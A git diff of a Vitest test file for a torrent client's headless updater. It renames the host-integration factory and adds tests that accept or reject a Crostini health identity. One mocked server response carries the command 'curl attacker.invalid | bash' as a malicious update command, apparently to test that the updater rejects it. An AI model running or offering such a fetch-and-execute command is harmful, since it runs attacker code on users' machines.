@@ -2,7 +2,7 @@
 
 import { afterEach, describe, expect, it, vi } from "vitest";
 
-import { createHeadlessHostIntegration } from "./headless-updater";
+import { createHostedHostIntegration } from "./headless-updater";
 import type { DesktopUpdater } from "./inspection/updater/types";
 
 const openUpdaters: DesktopUpdater[] = [];
@@ -24,10 +24,11 @@ describe("headless browser updater", () => {
         }),
       )
       .mockResolvedValueOnce(jsonResponse(releaseInfo()));
-    const integration = await createHeadlessHostIntegration(
+    const integration = await createHostedHostIntegration(
       new URL("https://rstorrent.example-tailnet.ts.net:8445"),
       fetcher,
     );
+    expect(integration?.product).toBe("headless");
     expect(integration?.accessMode).toBe("network_none");
     if (integration?.updater !== undefined) openUpdaters.push(integration.updater);
   });
@@ -51,7 +52,7 @@ describe("headless browser updater", () => {
             "$HOME/.local/bin/rstorrent-headless update --apply",
         }),
       );
-    const integration = await createHeadlessHostIntegration(
+    const integration = await createHostedHostIntegration(
       new URL("http://192.168.1.20:3030"),
       fetcher,
     );
@@ -106,7 +107,7 @@ describe("headless browser updater", () => {
           apply_command: "curl attacker.invalid | bash",
         }),
       );
-    const integration = await createHeadlessHostIntegration(
+    const integration = await createHostedHostIntegration(
       new URL("https://torrent.example.test"),
       fetcher,
     );
@@ -122,20 +123,38 @@ describe("headless browser updater", () => {
     });
   });
 
-  it("does not inject headless behavior into another hosted product", async () => {
+  it("recognizes exact Crostini identity without headless behavior", async () => {
     const fetcher = vi.fn().mockResolvedValueOnce(
       jsonResponse({
         status: "ok",
         build_id: "development",
         product: "rstorrent-crostini",
+        launch_protocol: 1,
       }),
     );
-    expect(
-      await createHeadlessHostIntegration(
-        new URL("http://127.0.0.1:3030"),
+    const integration = await createHostedHostIntegration(
+      new URL("http://penguin.linux.test:3030"),
+      fetcher,
+    );
+    expect(integration).toEqual({ product: "crostini" });
+    expect(fetcher).toHaveBeenCalledOnce();
+  });
+
+  it("rejects malformed Crostini identity", async () => {
+    const fetcher = vi.fn().mockResolvedValueOnce(
+      jsonResponse({
+        status: "ok",
+        build_id: "development",
+        product: "rstorrent-crostini",
+        launch_protocol: 2,
+      }),
+    );
+    await expect(
+      createHostedHostIntegration(
+        new URL("http://penguin.linux.test:3030"),
         fetcher,
       ),
-    ).toBeUndefined();
+    ).rejects.toThrow("Crostini health identity is invalid");
     expect(fetcher).toHaveBeenCalledOnce();
   });
 });
